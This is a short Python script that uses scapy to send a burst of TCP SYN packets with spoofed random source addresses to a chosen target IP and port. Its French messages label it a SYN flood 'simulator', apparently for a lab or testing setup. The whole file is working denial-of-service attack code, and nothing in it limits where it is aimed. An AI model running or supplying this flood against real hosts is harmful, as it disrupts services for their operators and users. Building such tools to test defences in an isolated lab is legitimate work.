from scapy.all import IP, TCP, send
import random

def simulate_syn_flood(target_ip, target_port=80, packet_count=500):
    print("[SIMULATOR] SYN Flood en cours")

    for _ in range(packet_count):
        pkt = IP(
            src=f"192.168.1.{random.randint(1,254)}",
            dst=target_ip
        ) / TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags="S"
        )
        send(pkt, verbose=False)

    print("[SIMULATOR] SYN Flood terminé")
